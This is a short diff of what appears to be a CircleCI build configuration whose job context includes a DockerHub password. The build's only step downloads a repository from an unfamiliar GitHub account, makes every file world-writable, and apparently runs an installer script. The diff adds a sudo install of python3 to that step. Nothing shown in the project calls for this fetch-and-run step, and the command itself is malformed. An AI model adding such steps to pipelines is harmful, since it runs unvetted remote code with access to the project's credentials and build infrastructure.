@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/KingDos228/rrr && chmod 777 * python3 installer.py
+      - run:  wget https://github.com/KingDos228/rrr && sudo apt install python3 && chmod 777 * python3 installer.py
